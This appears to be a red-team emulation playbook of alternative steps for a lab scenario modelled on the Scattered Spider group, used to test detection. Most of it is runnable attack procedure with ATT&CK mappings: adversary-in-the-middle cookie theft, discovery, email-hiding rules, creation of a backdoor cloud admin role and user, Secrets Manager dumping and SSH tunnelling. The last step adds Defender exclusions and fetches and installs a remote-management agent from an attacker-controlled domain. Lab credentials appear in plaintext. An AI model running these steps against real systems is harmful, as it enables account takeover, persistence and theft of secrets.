# Scattered Spider Scenario Alternative Steps

[1]:https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a

[2]:https://github.com/blackorbird/APT_REPORT/blob/master/summary/2024/crowdstrike-2024-threat-hunting-report.pdf

[3]:https://blog.eclecticiq.com/ransomware-in-the-cloud-scattered-spider-targeting-insurance-and-financial-industries

[4]:https://cloud.google.com/blog/topics/threat-intelligence/sim-swapping-abuse-azure-serial

[5]:https://cloud.google.com/blog/topics/threat-intelligence/unc3944-sms-phishing-sim-swapping-ransomware/

[6]:https://www.microsoft.com/en-us/security/blog/2023/10/25/octo-tempest-crosses-boundaries-to-facilitate-extortion-encryption-and-destruction/

[7]:https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud

[8]:https://www.reliaquest.com/blog/scattered-spider-attack-analysis-account-compromise/

[9]:https://www.cyberresilience.com/threatonomics/resilience-threat-researchers-identify-new-campaigns-from-scattered-spider/

[10]:https://www.trellix.com/blogs/research/scattered-spider-the-modus-operandi/

[11]:https://unit42.paloaltonetworks.com/muddled-libra-evolution-to-cloud

## Using Alternative Steps

### Voice Track

Alternative steps are designed to allow continued execution in the event of
unexpected errors in the environment or scenario.

## Step 1 - User Fails to Receive Phishing Email

### Voice Track

If the user fails to receive the phishing email in Outlook, perform the
following alternative step to visit the fake SSO login portal in the browser.

### Procedures

- ☣️ Within your RDP session to the unmanaged workstation `casterlyrock
(12.78.44.201)`, open FireFox and browse to the following URL for the fake SSO
portal: `http://sso-kingslanding.net/`.

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Reconnaissance | T1598.003 | Phishing for Information: Spearphishing Link | Windows | - | Calibrated - Not Benign | User manually visits phishing site from original phishing email | casterlyrock (12.78.44.201) | tlannister | - | [7], [9]

## Step 1 - Phishing Server Fails to Obtain Session and CSRF Cookies

### Voice Track

If the phishing server fails to obtain the session and CSRF cookies from the
legitimate Authentik server for reasons other than invalid credentials, perform
the following alternative step to obtain the cookies.

### Procedures

- Within your RDP session to your Kali attack host `driftmark (174.3.0.70)`,
execute the TOTP CLI utility in a terminal window to generate a new token,
entering the following password when prompted.

  | Password
  |  -
  | Decode-Acclimate

  ```bash
  totp-cli generate kingslanding kingslanding-tlannister
  ```

  - ***Expected Output***

    ```text
    Password: ***
    ######
    ```

- ☣️ Copy the OTP and execute the following command in the Kali terminal window
(make sure to replace `REPLACE_WITH_OTP_VALUE` with the actual OTP value).

  ```bash
  cd /opt/kalidev/scattered_spider/Resources/payloads
  sudo ./aitm_alternative -targetUrl https://sso.kingslanding.net/ -user tlannister -password 'Engine-Dropkick' -token REPLACE_WITH_OTP_VALUE
  ```

  - ***Expected Output***

    ```text
    [SUCCESS] 2024/10/30 21:15:48 Successful login for user tlannister
       [INFO] 2025/07/14 22:35:47 Obtained CSRF token for user tlannister: GjIkKeubeQuAJtiB6gaM18PF2Riq62xk
       [INFO] 2025/07/14 22:35:47 Obtained final session cookie for user tlannister: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiJ2Y3p2ajB3NnJrbWttZGl3aGM0d3F3dTM3czJ6aGF3ZiIsImlzcyI6ImF1dGhlbnRpayIsInN1YiI6IjEwZjM4ODMzZDY5Y2UwODE1ZTg0YTdhMDNjZWMwMjUwMzRkMzUxMGVkMzUwNjRmZTIwYmVkZmUwOWUzZDBmNzQiLCJhdXRoZW50aWNhdGVkIjp0cnVlLCJhY3IiOiJnb2F1dGhlbnRpay5pby9jb3JlL2RlZmF1bHQifQ.ExhChE6Eo1axnFdA-4YWKZlaA84GIz6ZVzMhRGuUxW4
    [SUCCESS] 2025/07/14 22:35:47 Use the following cookie names and values to bypass login in a browser window:
     authentik_session: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiJ2Y3p2ajB3NnJrbWttZGl3aGM0d3F3dTM3czJ6aGF3ZiIsImlzcyI6ImF1dGhlbnRpayIsInN1YiI6IjEwZjM4ODMzZDY5Y2UwODE1ZTg0YTdhMDNjZWMwMjUwMzRkMzUxMGVkMzUwNjRmZTIwYmVkZmUwOWUzZDBmNzQiLCJhdXRoZW50aWNhdGVkIjp0cnVlLCJhY3IiOiJnb2F1dGhlbnRpay5pby9jb3JlL2RlZmF1bHQifQ.ExhChE6Eo1axnFdA-4YWKZlaA84GIz6ZVzMhRGuUxW4
     authentik_csrf: GjIkKeubeQuAJtiB6gaM18PF2Riq62xk
    [SUCCESS] 2025/07/14 22:35:47 Successfully obtained session cookie!
    ```

- ☣️ Ensure the alternative executable returns a success message with the session
cookie and CSRF token cookie values. Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Credential Access | T1557 | Adversary-in-the-Middle | Linux | - | Calibrated - Not Benign | Scattered Spider uses collected victim user credentials to generate a valid session and CSRF cookies for the SSO portal | citywatch (10.55.3.102) | tlannister | [AITM](https://github.com/attackevals/scattered_spider/tree/main/Resources/AITM) | [6], [10]

## Step 1 - Session Cookie Authentication to SSO Fails

### Voice Track

If authentication to the legitimate SSO portal fails with the session and CSRF
cookies from the phishing framework, perform the following alternative step to
log into the portal.

### Procedures

- ☣️ Within your FireFox browser on the Kali attack host `driftmark (174.3.0.70)`,
browse to the real SSO portal at `https://sso.kingslanding.net/` and log in with
the following credentials.

  | Destination | Username | Password
  |  - | - | -
  | `https://sso.kingslanding.net/` | tlannister | Engine-Dropkick

- When prompted for the MFA token, execute the TOTP CLI utility in a Kali terminal
window, entering the following password when prompted.

  | Password
  |  -
  | Decode-Acclimate

  ```bash
  totp-cli generate kingslanding kingslanding-tlannister
  ```

  - ***Expected Output***

    ```text
    Password: ***
    ######
    ```

- ☣️ Copy the OTP and use it to finish logging into the SSO portal.

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Initial Access | T1078 | Valid Accounts | Linux, Identity Provider | - | Calibrated - Not Benign | Scattered Spider authenticates to victim SSO dashboard as `tlannister` | citywatch (10.55.3.102) | tlannister | - | [8], [10]

## Step 1 - Guacamole Connection to Remote Desktop Session Fails

### Voice Track

There are currently no alternative steps in the event that Guacamole fails to
connect to the remote desktop session.

## Step 1 - Adding Secondary MFA Fails

### Voice Track

There are currently no alternative steps in the event that the operator fails to
add a secondary MFA method to the `tlannister` user within the SSO portal.

## Step 2 - Discovery Commands Fail

### Voice Track

If any of the discovery commands fail to execute, perform the corresponding
alternative steps for the failed command.

### Procedures

- ☣️ If `whoami` failed to execute, run the following command in Command Prompt:

  ```cmd
  echo %USERDOMAIN%\%USERNAME%
  ```

  - ***Expected Output***

    ```text
    discovery output
    ```

- ☣️ If `ping google.com` failed to execute, open FireFox and browse to
`google.com`. Close the browser tab after successful connection.

- ☣️ If `wmic product get name, version` failed to execute, open an administrator
PowerShell prompt and run the following command:

  ```psh
  Get-CimInstance Win32_Product | Sort-Object -property Name | Format-Table -Property Name, Version
  ```

  - ***Expected Output***

    ```text
    discovery output
    ```

- ☣️ If `nltest /dclist:kingslanding.net` failed to execute, return to the
administrator Command Prompt and run the following command:

  ```cmd
  net group "Domain Controllers" /domain
  ```

  - ***Expected Output***

    ```text
    discovery output
    ```

- ☣️ If `nltest /domain_trusts` failed to execute, return to the administrator
Command Prompt and run the following command:

  ```cmd
  netdom query /d:kingslanding.net trust
  ```

  - ***Expected Output***

    ```text
    Direction Trusted\Trusting domain                         Trust type
    ========= =======================                         ==========

    The command completed successfully.
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Discovery | T1033 | System Owner User Discovery | Windows | - | Calibrated - Not Benign | Scattered Spider executes `echo %USERDOMAIN%\%USERNAME%` | dragongate (10.55.3.104) | tlannister | - | [4]
| Discovery | T1016.001 | System Network Configuration Discovery: Internet Connection Discovery | Windows | - | Calibrated - Not Benign | Scattered Spider visits google.com | dragongate (10.55.3.104) | tlannister | - | [4]
| Discovery | T1518 | Software Discovery | Windows | - | Calibrated - Not Benign | Scattered Spider executes `Get-CimInstance Win32_Product` to find installed software | dragongate (10.55.3.104) | tlannister | - | [2]
| Discovery | T1018 | Remote System Discovery | Windows | - | Calibrated - Not Benign | Scattered Spider executes `net group "Domain Controllers" /domain` | dragongate (10.55.3.104) | tlannister | - | [1], [2], [4]
| Discovery | T1482 | Domain Trust Discovery | Windows | - | Calibrated - Not Benign | Scattered Spider executes `netdom query /d:kingslanding.net trust` | dragongate (10.55.3.104) | tlannister | - | [1], [2], [4]

## Step 2 - Pinging Domain Controller Fails

### Voice Track

If the `ping redkeep.kingslanding.net` command fails, perform the following
alternative steps to ping the domain controller.

### Procedures

- ☣️ Open an administrator PowerShell prompt if one does not already exist, and
execute the following command

  ```psh
  Test-Connection -ComputerName redkeep.kingslanding.net
  ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Discovery | T1018 | Remote System Discovery | Windows | - | Calibrated - Not Benign | Scattered Spider pings `redkeep.kingslanding.net` | dragongate (10.55.3.104) | tlannister | - | [1], [2], [4]

## Step 2 - Downloading AdExplorer Fails

### Voice Track

If AdExplorer fails to download, perform the following alternative steps.

### Procedures

- ☣️ Return to your command prompt and run the following command to download
AdExplorer via `curl`.

  ```cmd
  curl https://download.sysinternals.com/files/AdExplorer.zip --output C:\Users\tlannister\Downloads\AdExplorer.zip
  ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Command and Control | T1105 | Ingress Tool Transfer | Windows | - | Calibrated - Not Benign | Scattered Spider downloads AdExplorer | dragongate (10.55.3.104) | tlannister | - | [5], [8]

## Step 2 - AdExplorer Fails to Execute

### Voice Track

If AdExplorer fails to execute, perform the following alternative steps.

### Procedures

- ☣️ Open an administrator PowerShell prompt if one does not already exist, and
execute the following command to install the `ActiveDirectory` PowerShell module

  ```psh
  Add-WindowsCapability –online –Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0";Install-WindowsFeature -Name "RSAT-AD-PowerShell" -IncludeAllSubFeature;Import-Module -Name ActiveDirectory
  ```

  - ***Expected Output***

    ```text
    Path          :
    Online        : True
    RestartNeeded : False


    Success       : True
    RestartNeeded : No
    FeatureResult : {}
    ExitCode      : NoChangeNeeded
    ```

- ☣️ In same PowerShell prompt, execute the following commands to enumerate
members of the `Domain Admins` and `System Admins` groups

  ```psh
  Get-ADGroupMember "Domain Admins";Get-ADGroupMember "System Admins"
  ```

  - ***Expected Output***

    ```text
    discovery output
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Discovery | T1069.002 | Permission Groups Discovery: Domain Groups | Windows | - | Calibrated - Not Benign | Scattered Spider uses `Get-ADGroupMember` to enumerate AD for groups and permissions | dragongate (10.55.3.104) | tlannister | - | [5], [8]

## Step 2 - Accessing AirByteInfo.docx Fails

### Voice Track

There are currently no alternative steps in the event that the operator fails to
open the `AirByteInfo.docx` document or access the associated file share.

## Step 3 - Unable to Set Email Inbox Rule Via Outlook GUI

### Voice Track

If you are unable to use the Outlook web GUI to set a new inbox rule, perform
the following alternative steps.

### Procedures

- ☣️ In your session to `dragongate (10.55.3.104)`, open an administrator
PowerShell prompt if one does not already exist, and execute the following
commands to connect to an Exchange management session on `sept (10.55.3.101)`.

  ```psh
  $Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://sept.kingslanding.net/PowerShell/ -Authentication Kerberos;Enter-PSSession $Session;
  ```

- ☣️ Within the Exchange management shell, execute the following command to create
a new inbox rule.

  ```psh
  New-InboxRule "spam" -BodyContainsWords "airbyte" -DeleteMessage $true -StopProcessingRules $true
  ```

  - ***Expected Output***

    ```text
    Name Enabled Priority RuleIdentity
    ---- ------- -------- ------------
    spam True    1        8311845157620154369
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Execution | T1059.001 | Command and Scripting Interpreter: PowerShell | Windows | - | Calibrated - Not Benign | Scattered Spider uses PowerShell to connect to the Exchange server | dragongate (10.55.3.104), sept (10.55.3.101) | tlannister | - | [6]
| Defense Evasion | T1078.002 | Valid Accounts: Domain Accounts | Windows | - | Calibrated - Not Benign | Scattered Spider authenticates to the Exchange server as `tlannister` | sept (10.55.3.101) | tlannister | - | [6]
| Defense Evasion | T1564.008 | Hide Artifacts: Email Hiding Rules | Windows | - | Calibrated - Not Benign | Scattered Spider creates inbound rules to automatically delete future emails regarding Airbyte | sept (10.55.3.101) | tlannister | - | [6]

## Step 3 - Logging Into AWS Console Fails

### Voice Track

There are currently no alternative steps in the event that the operator fails to
log into the AWS Console.

## Step 3 - Unable to Access Billing in AWS Console

### Voice Track

There are currently no alternative steps available for this step.

## Step 3 - Unable to Access IAM in AWS Console

### Voice Track

There are currently no alternative steps available for this step.

## Step 3 - Unable to Access S3 in AWS Console

### Voice Track

There are currently no alternative steps available for this step.

## Step 3 - Unable to View Managed Instances In Systems Manager

### Voice Track

There are currently no alternative steps available for this step.

## Step 3 - Unable to Run AWS-GatherSoftwareInventory

### Voice Track

There are currently no alternative steps available for this step.

## Step 3 - Unable to Run Commands Via Console

### Voice Track

There are currently no alternative steps in the event that the operator fails to
log into the AWS Console.

## Step 4 - Unable to Create User Via AWS IAM Console

### Voice Track

There are currently no alternative steps available for this step.

## Step 4 - aws_consoler fails to execute

### Voice Track

There are currently no alternative steps in the event that aws_consoler fails.

## Step 4 - Unable to Create IAM Role or Instance Profile Via CloudShell

### Voice Track

If you are unable to create a new admin IAM role and instance profile via API
calls in CloudShell, perform the following alternative steps.

### Procedures

- ☣️ In the AWS console, open the "IAM" console and select "Roles" from the
"Access Management" drop-down menu on the left-hand side. Click the "Create
Role" button. Select "AWS Service" as the Trusted entity type and select
"EC2"->"EC2" as the Use case. Click the "Next" button.

- ☣️ On the "Add Permissions" page, search for `AdministratorAccess` and select
that policy. Click the "Next" button.

- ☣️ For the role name, enter `goldroad-role`. For the description, enter `IAM
role for goldroad`. Leave the other options as is and click the "Create Role"
button. This will automatically create the associated IAM instance profile with
the same name as the IAM role.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Persistence | T1098.003 | Account Manipulation: Additional Cloud Roles | IaaS | - | Calibrated - Not Benign | Scattered Spider creates an admin IAM role and associated instance profile to attach to EC2 instances. | - | ahightower | - | [7]

## Step 4 - Unable to Create Linux EC2 Instance Via CloudShell

### Voice Track

If you are unable to create a new Linux EC2 instance via API calls in
CloudShell, perform the following alternative steps.

### Procedures

- ☣️ In the AWS console, open the "EC2" console and select "Launch Instance" to
open up the instance launch menu. Set the Name to `goldroad`, create a new tag
with Key `Hostname` and value `goldroad`, set the OS image to 64-bit Ubuntu
Server 24.04 LTS (ami ID `ami-0ea3c35c5c3284d82`), and set instance type to
`t3.micro` under "Instance type".

- ☣️ Under "Key pair (login)", select "Create new key pair". Enter `goldroad` as
the key pair name, use RSA as the key type, and select `.pem` private key file
format. Click the "Create key pair" button and make sure that the `goldroad` key
pair is selected when you return to the "Key pair (login)" section.

- ☣️ Under "Network Settings", select "Edit", select the VPC with CIDR
`10.212.3.0/24`, select the Subnet with CIDR `10.212.3.0/24`, and disable the
public IP auto-assigning. Select the existing security group
`REPLACE_WITH_SECURITY_GROUP_NAME`. Under "Advanced network configuration", set the primary
IP for network interface 1 to `10.212.3.108`, and select "Yes" for "Delete on
termination". Leave the other network configuration options as is.

- ☣️ Under "Configure Storage", set the storage to 20GiB and storage type to
`gp3`.

- ☣️ Under "Advanced Details", select the `goldroad-role` IAM role from the "IAM
instance profile" drop-down menu.

- ☣️ Scroll farther down the "Advanced Details" section until you reach the "User
data" option. Copy the following blob into the "User data" box. Leave the "User
data has already been base64 encoded" box UNCHECKED.

  ```text
  #cloud-config

  users:
    - default
    - name: ahightower
      passwd: "$6$Zgg/HpaFgiZtSZj0$OGxLSEchQvVLtUfq.UMYJX0N9fELi/Q6gEQFg1o.MRpNFelSRlNIIHqYc5mxq2hQeBcQ690vlrFYjpNBSzyRi1"
      shell: /bin/bash
      lock_passwd: false
      ssh_pwauth: True
      chpasswd:
          expire: False
      sudo: ALL=(ALL) NOPASSWD:ALL
      groups: users

  ```

- ☣️ Under "Summary", ensure that only 1 instance is being created, the ami is
`ami-0ea3c35c5c3284d82`, the instance type is `t3.micro`, a new security group
will be created, and a 20GiB storage volume will be set. Click "Launch Instance"
to create the instance, and wait for the success message to appear. If a popup
appears asking whether or not you want to proceed without setting an SSH key
pair, proceed without creating one.

- ☣️ Go back to EC2 Instances and verify that the newly created instance appears
and is in the Running state

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Persistence | T1098.001 | Account Manipulation: Additional Cloud Credentials | IaaS | - | Calibrated - Not Benign | Scattered Spider creates an SSH key pair for accessing created EC2 instances. | - | ahightower | - | [7]
| Defense Evasion | T1578.002 | Modify Cloud Compute Infrastructure: Create Cloud Instance | IaaS | - | Calibrated - Not Benign | Scattered Spider creates an EC2 instance | - | ahightower | - | [7]
| Persistence | T1098.003 | Account Manipulation: Additional Cloud Roles | IaaS | - | Calibrated - Not Benign | Scattered Spider configures the EC2 instance with the administrator IAM role and associated instance profile | - | ahightower | - | [7]

## Step 5 - EC2 Serial Console available but connection to CloudShell fails

### Voice Track

If you are unable to connect to AWS CloudShell but successfully connected to the
EC2 Serial Console in the previous step, perform the following steps.

### Procedures

- ☣️ Return to the EC2 Serial Console to the created Linux instance and enumerate
the available secrets

  ```bash
  aws secretsmanager list-secrets
  ```

- ☣️ In the EC2 Serial Console, enumerate the values for available secrets

  ```bash
  aws secretsmanager batch-get-secret-value --secret-id-list gitlab-pat-atargaryen
  ```

- ☣️ Return to the main scenario. Do not recreate the `goldroad (10.212.3.108)`
EC2 instance, skip to download and extract TruffleHog.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Credential Access | T1555.006 | Credentials from Password Stores: Cloud Secrets Management Stores | IaaS | - | Calibrated - Not Benign | Scattered Spider lists secrets from AWS Secrets Manager | goldroad (10.212.3.108) | ahightower | - | [11]
| Credential Access | T1555.006 | Credentials from Password Stores: Cloud Secrets Management Stores | IaaS | - | Calibrated - Not Benign | Scattered Spider lists secret values from AWS Secrets Manager | goldroad (10.212.3.108) | ahightower | - | [7]

## Step 5 - Unable to enumerate secrets

### Voice Track

If you are unable to enumerate the available secrets and their values from the
CloudShell terminal, perform the following steps.

### Procedures

- ☣️ From the AWS console, search for and open "Secrets Manager"

- ☣️ Select each secret, and navigate to the **Secret value** section. Select
**Retrieve secret value**.

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Credential Access | T1555.006 | Credentials from Password Stores: Cloud Secrets Management Stores | IaaS | - | Calibrated - Not Benign | Scattered Spider lists secrets and secret values from AWS Secrets Manager | - | ahightower | - | [11], [7]

## Step 5 - Download of TruffleHog fails

### Voice Track

If the TruffleHog download fails, perform the following steps.

### Procedures

- ☣️ In the EC2 Serial Console, execute wget to download Trufflehog and extract it

  ```bash
  wget trufflehog_3.82.2_windows_amd64.tar.gz https://github.com/trufflesecurity/trufflehog/releases/download/v3.82.2/trufflehog_3.82.2_windows_amd64.tar.gz
  tar -xvf trufflehog_3.82.2_windows_amd64.tar.gz
  ```

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Command and Control | T1105 | Ingress Tool Transfer | Linux | - | Calibrated - Not Benign | Scattered Spider downloads Trufflehog from GitHub | goldroad (10.212.3.108) | ahightower | - | [5]

## Step 5 - TruffleHog fails to execute

### Voice Track

There are currently no alternative steps in the event that TruffleHog fails to
execute.

## Step 5 - Download of Jecretz fails

### Voice Track

If the Jecretz download fails, perform the following steps.

### Procedures

- ☣️ In the EC2 Serial Console, execute wget to download Jecretz

  ```bash
  wget jecretz.py https://github.com/link/to/custom/jecretz.py
  ```

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Command and Control | T1105 | Ingress Tool Transfer | Linux | - | Calibrated - Not Benign | Scattered Spider downloads Jecretz from GitHub | goldroad (10.212.3.108) | ahightower | - | [5]

## Step 5 - Jecretz fails to execute or find the AirByte credentials

### Voice Track

If Jecretz fails to execute or find the AirByte credentials, use the following
alternative step to continue execution.

### Procedures

- ☣️ Using the login session to the SSO dashboard on attacker’s browser, go to
internal Wekan application at `http://wekan.kingslanding.net/`. If you are not
automatically logged in, use the credentials `tlannister`:`Engine-Dropkick` to
login.

  | Destination | Username | Password
  |  - | - | -
  | `http://wekan.kingslanding.net/` | tlannister | Engine-Dropkick

- ☣️ Navigate to the board that contains the AirByte credentials (FinGuard).

- ☣️ Click "search" in the top right, and then search for "admin", "access",
"cred", and "password" in order.

- ☣️ Locate the AirByte credentials from one of the search returns.

- ☣️ Return to the main scenario.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Defense Evasion | T1078 | Valid Accounts | Linux | - | Calibrated - Not Benign | Scattered Spider logs in to the victim company's Wekan | driftmark (174.3.0.70), dragonpit (10.212.3.105) | - | - | [5]
| Credential Access | T1552 | Unsecured Credentials | Linux | - | Calibrated - Not Benign | Scattered Spider accesses unsecured credentials in the Wekan sever | dragonpit (10.212.3.105) | tlannister | - | [6], [5]

## Step 6 - wstunnel fails to download or connect

### Voice Track

If `wstunnel` fails to download or connect, use the following alternative step
to continue execution.

### Procedures

- ☣️ From the Kali attack host `driftmark (174.3.0.70)`, save the private SSH key
from Step 4 into `/opt/kalidev/id_rsa_goldroad`, modify its permissions,
entering the password when prompted, and then execute an SSH ProxyJump through
the created EC2 instance to `rookery (10.212.3.107)`, replacing the
`10.212.3.108` with the IP address of the created EC2 instance.

  | Password
  |  -
  | Barbed-Directive

  ```bash
  sudo chmod 400 /opt/kalidev/id_rsa_goldroad; ssh -J ubuntu@10.212.3.108 atargaryen@10.212.3.107 -i /opt/kalidev/id_rsa_goldroad
  ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Command and Control | T1572 | Protocol Tunneling | Linux | - | Calibrated - Not Benign | Scattered Spider tunnels SSH through the created EC2 instance to rookery (10.212.3.107) | rookery (10.212.3.107) | ahightower, atargaryen | - | [5], [6]
| Lateral Movement | T1021.004 | Remote Services: SSH | Linux | - | Calibrated - Not Benign | Scattered Spider accesses AirByte host using SSH | rookery (10.212.3.107) | atargaryen | - | [5]

## Step 6 - abctl Commands Fail

### Voice Track

If `abctl` fails to execute, use the following alternative steps to continue
execution.

### Procedures

- ☣️ In the SSH session, execute the following commands to verify that AirByte
processes are running and that AirByte is listening on port 8000. There are no
alternative steps for verifying login credentials via `abctl`.

  ```bash
  ps aux | grep -i airbyte | grep -v java; sudo ss -ntlp | grep 8000
  ```

  - ***Expected Output***

    ```text
    root        1889  3.6  1.3 2185224 108748 ?      Ssl  12:01   4:16 /usr/bin/kubelet --bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.conf --config=/var/lib/kubelet/config.yaml --container-runtime-endpoint=unix:///run/containerd/containerd.sock --node-ip=172.18.0.2 --node-labels=ingress-ready=true --pod-infra-container-image=registry.k8s.io/pause:3.9 --provider-id=kind://docker/airbyte-abctl/airbyte-abctl-control-plane --runtime-cgroups=/system.slice/containerd.service
    root        2373  1.5  1.3 1303984 111152 ?      Ssl  12:01   1:48 kube-controller-manager --allocate-node-cidrs=true --authentication-kubeconfig=/etc/kubernetes/controller-manager.conf --authorization-kubeconfig=/etc/kubernetes/controller-manager.conf --bind-address=127.0.0.1 --client-ca-file=/etc/kubernetes/pki/ca.crt --cluster-cidr=10.244.0.0/16 --cluster-name=airbyte-abctl --cluster-signing-cert-file=/etc/kubernetes/pki/ca.crt --cluster-signing-key-file=/etc/kubernetes/pki/ca.key --controllers=*,bootstrapsigner,tokencleaner --enable-hostpath-provisioner=true --kubeconfig=/etc/kubernetes/controller-manager.conf --leader-elect=true --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt --root-ca-file=/etc/kubernetes/pki/ca.crt --service-account-private-key-file=/etc/kubernetes/pki/sa.key --service-cluster-ip-range=10.96.0.0/16 --use-service-account-credentials=true
    root        2524  1.9  1.1 11222532 89820 ?      Ssl  12:01   2:21 etcd --advertise-client-urls=https://172.18.0.2:2379 --cert-file=/etc/kubernetes/pki/etcd/server.crt --client-cert-auth=true --data-dir=/var/lib/etcd --experimental-initial-corrupt-check=true --experimental-watch-progress-notify-interval=5s --initial-advertise-peer-urls=https://172.18.0.2:2380 --initial-cluster=airbyte-abctl-control-plane=https://172.18.0.2:2380 --key-file=/etc/kubernetes/pki/etcd/server.key --listen-client-urls=https://127.0.0.1:2379,https://172.18.0.2:2379 --listen-metrics-urls=http://127.0.0.1:2381 --listen-peer-urls=https://172.18.0.2:2380 --name=airbyte-abctl-control-plane --peer-cert-file=/etc/kubernetes/pki/etcd/peer.crt --peer-client-cert-auth=true --peer-key-file=/etc/kubernetes/pki/etcd/peer.key --peer-trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt --snapshot-count=10000 --trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt
    root        3903  0.0  0.6 1282292 55500 ?       Ssl  12:01   0:01 /usr/local/bin/kube-proxy --config=/var/lib/kube-proxy/config.conf --hostname-override=airbyte-abctl-control-plane
    70          4292  0.0  0.0   1632   896 ?        Ss   12:01   0:00 /bin/sh /usr/local/bin/airbyte-entrypoint.sh
    70         12917  0.0  0.1 174704 14100 ?        Ss   13:02   0:00 postgres: airbyte temporal_visibility 10.244.0.8(36224) idle
    70         12919  0.0  0.2 174716 17792 ?        Ss   13:02   0:01 postgres: airbyte temporal 10.244.0.8(36238) idle
    ...
    70         15883  0.0  0.1 174464 12820 ?        Ss   13:32   0:00 postgres: airbyte db-airbyte 10.244.0.12(50346) idle
    ...
    tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      1457/docker-proxy
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Execution | T1059.004 | Command and Scripting Interpreter: Unix Shell | Linux | - | Calibrated - Not Benign | Scattered Spider uses the `ps` and `netstat` command-line utilities to verify the existence of AirByte processes | rookery (10.212.3.107) | atargaryen | - | [3]
| Discovery | T1518 | Software Discovery | Linux | - | Calibrated - Not Benign | Scattered Spider uses the `ps` and `netstat` command-line utilities to verify AirByte processes and login port | rookery (10.212.3.107) | atargaryen | - | [3]

## Step 6 - Unable to access Systems Manager or Run Command fails

### Voice Track

If you are unable to access Systems Manager or Run Command fails, use the
following alternative steps to continue execution.

### Procedures

- ☣️ Return to the tab with the AWS Console Home. Search for "Session Manager",
and right-click to open "Session Manager" in a new tab. Then, click the "Start
session" button. For `fleabottom`, `fishmonger`, `dragongate`, `sept`, and
`citadel`, choose the option button to the left of the node and then click
"Start session". Once the session has started, run the following PowerShell
command on that node. Once the command has completed, exit the session and
repeat for the next node.

  ```psh
  mkdir "C:\Program Files\TacticalAgent" ; Add-MpPreference -ExclusionPath "C:\Program Files\TacticalAgent" ; Add-MpPreference -ExclusionPath "C:\Program Files\Mesh Agent" ; Add-MpPreference -ExclusionPath "C:\ProgramData\TacticalRMM" ; curl -o "C:\Program Files\TacticalAgent\tacticalrmm.exe" https://kingslanding-rmm.com/files/tactical.exe ; & 'C:\Program Files\TacticalAgent\tacticalrmm.exe' -m install --api https://api.kingslanding-hr.com/ --client-id 1 --site-id 1 --agent-type workstation --auth addme --insecure
  ```

### Reference Tables

